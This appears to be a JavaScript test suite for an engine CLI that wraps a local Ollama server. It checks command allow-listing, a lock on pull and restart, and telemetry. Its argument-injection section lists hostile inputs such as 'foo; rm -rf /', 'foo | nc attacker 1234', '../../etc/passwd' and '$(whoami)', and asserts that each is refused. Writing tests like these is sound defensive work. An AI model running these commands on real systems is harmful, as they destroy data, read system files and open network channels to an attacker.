/*
  Runs the REAL engine CLI against a REAL local HTTP server standing in for Ollama.
  Nothing is stubbed except Ollama itself, so the axios calls, the allow-list and the
  refusals are all genuinely exercised.
*/
import http from "node:http";
import { runEngineCommand } from "../dist/services/engineCli.js";
import {
  recentLines, resetTelemetry, publishScrape, publishViewport, latestViewport,
  recentScrapes, noteEngineActivity, clearEngineActivity, currentEngineActivity,
  subscribeTelemetry, hasSubscribers, backlog, publishLine,
} from "../dist/services/engineTelemetry.js";

let passed = 0, failed = 0;
const check = (name, ok, detail = "") => {
  console.log(`  ${ok ? "PASS" : "FAIL"}  ${name}${ok || !detail ? "" : ` — ${detail}`}`);
  ok ? passed++ : failed++;
};
const texts = (stream) =>
  recentLines().filter((l) => l.stream === stream).map((l) => l.text).join("\n");

// --- a fake Ollama -------------------------------------------------------------
let psRows = [{ name: "qwen2.5:1.5b", size_vram: 1200000000, expires_at: "2026-10-02T12:00:00Z" }];
const pulls = [];
function json(res, body) {
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify(body));
}
const fake = http.createServer((req, res) => {
  // THE REAL OLLAMA SHAPES. /api/tags and /api/ps both wrap in `models`; an older
  // server answers `data` for /api/ps. The fake used to answer `data`, which is
  // exactly the mismatch that hid a real bug in the health probe — so it now
  // matches production, and verify-engine-health.mjs covers the legacy shape.
  if (req.url === "/api/ps") return json(res, { models: psRows });
  if (req.url === "/api/tags") {
    return json(res, {
      models: [{ name: "qwen2.5:1.5b", size: 986000000, modified_at: "2026-10-01T09:00:00Z" }],
    });
  }
  if (req.url === "/api/legacy-ps") return json(res, { data: psRows });
  if (req.url === "/api/generate") {
    return json(res, { response: "pong", eval_count: 42, eval_duration: 2e9, total_duration: 3e9 });
  }
  res.writeHead(404).end();
});
await new Promise((r) => fake.listen(0, "127.0.0.1", r));
const origin = `http://127.0.0.1:${fake.address().port}`;

// `pull` and `restart` are recorded rather than executed: this suite tests the
// CLI's DECISION about them, not OllamaManager's implementation of them.
let unlocked = false;
let restarts = 0;
const deps = {
  origin,
  isUnlocked: () => unlocked,
  restart: async () => { restarts++; },
  pull: async (model) => { pulls.push(model); return { ok: true, message: `pulled ${model}` }; },
};

console.log("\n[ENGINE-CLI] allow-list, padlock and argument validation");

check("help succeeds", (await runEngineCommand("help", deps)).ok === true);
check("help lists the commands in the terminal", texts("out").includes("ollama ps"));

const ps = await runEngineCommand("ollama ps", deps);
check("ollama ps succeeds", ps.ok === true, ps.message);
check("ollama ps renders the resident model", texts("out").includes("qwen2.5:1.5b"));
check("ollama ps renders the VRAM column", /GB|MB/.test(texts("out")), texts("out"));

psRows = [];
const empty = await runEngineCommand("ollama ps", deps);
check("an empty ollama ps is OK, not an error", empty.ok === true, empty.message);
check("an empty ollama ps explains WHY (weights unload)", texts("out").includes("No models resident"));
psRows = [{ name: "qwen2.5:1.5b", size_vram: 1 }];

check("ollama list succeeds", (await runEngineCommand("ollama list", deps)).ok === true);
check("ollama list renders the installed model", texts("out").includes("qwen2.5:1.5b"));

const infer = await runEngineCommand("test-infer", deps);
check("test-infer succeeds", infer.ok === true, infer.message);
check("test-infer reports tokens/sec", /tok\/s/.test(infer.message), infer.message);

// --- THE PADLOCK ---------------------------------------------------------------
const lockedPull = await runEngineCommand("ollama pull qwen2.5:1.5b", deps);
check("ollama pull is REFUSED while locked", lockedPull.ok === false);
check("a refused pull never reaches the pull call", pulls.length === 0, JSON.stringify(pulls));
check("ollama restart is REFUSED while locked", (await runEngineCommand("ollama restart", deps)).ok === false);
check("a refused restart never reaches restart()", restarts === 0);
check("read-only commands still work while locked", (await runEngineCommand("ollama ps", deps)).ok === true);

unlocked = true;
check("ollama pull runs once unlocked", (await runEngineCommand("ollama pull qwen2.5:1.5b", deps)).ok === true);
check("the pull received exactly the validated model name", pulls[0] === "qwen2.5:1.5b", JSON.stringify(pulls));
const okRestart = await runEngineCommand("ollama restart", deps);
check("ollama restart runs once unlocked", okRestart.ok === true && restarts === 1);
// --- ARGUMENT INJECTION -------------------------------------------------------
const injections = [
  ["../../etc/passwd", "path traversal"],
  ["foo; rm -rf /", "command chaining"],
  ["foo && whoami", "logical and"],
  ["foo | nc attacker 1234", "pipe to a socket"],
  ["$(whoami)", "command substitution"],
  ["foo --insecure", "flag injection"],
  ["-malicious", "leading dash"],
  ["foo bar", "embedded space"],
  ["", "empty"],
];
for (const [arg, label] of injections) {
  const r = await runEngineCommand(`ollama pull ${arg}`, deps);
  check(`refuses ${label}`, r.ok === false, JSON.stringify(r.message));
}
check("NOT ONE malicious argument reached the pull call", pulls.length === 1, JSON.stringify(pulls));

const unknown = await runEngineCommand("rm -rf /", deps);
check("an unknown command is refused", unknown.ok === false);
check("an unknown command lists what IS available", unknown.message.includes("ollama ps"));

console.log("\n[ENGINE-CLI] telemetry bus");
const frames = [];
const off = subscribeTelemetry((f) => frames.push(f));
check("a subscriber means hasSubscribers()", hasSubscribers() === true);
publishLine("stdout", "hello from the engine");
check("a published line reaches subscribers", frames.some((f) => f.type === "line" && f.text.includes("hello")));
check("the backlog frame is a hello", backlog().type === "hello");
publishScrape("navigate", "[NAVIGATE] https://example.test", "https://example.test");
check("a scrape event is buffered", recentScrapes().some((e) => e.message.includes("NAVIGATE")));
publishViewport({ dataUrl: "data:image/jpeg;base64,AAA", title: "T", url: "https://example.test" });
check("a viewport frame replaces the previous one", latestViewport().title === "T");
off();
check("unsubscribing clears hasSubscribers()", hasSubscribers() === false);

noteEngineActivity("busy", "qwen2.5:1.5b", 50);
check("a busy mark is reported", currentEngineActivity()?.kind === "busy");
await new Promise((r) => setTimeout(r, 80));
check("an EXPIRED mark is ignored (badge cannot get stuck busy)", currentEngineActivity() === null);
noteEngineActivity("pulling", "big-model");
clearEngineActivity();
check("clearing removes the mark", currentEngineActivity() === null);

resetTelemetry();
fake.close();
console.log(`\n[ENGINE-CLI] ${passed}/${passed + failed} checks passed.`);
process.exit(failed ? 1 : 0);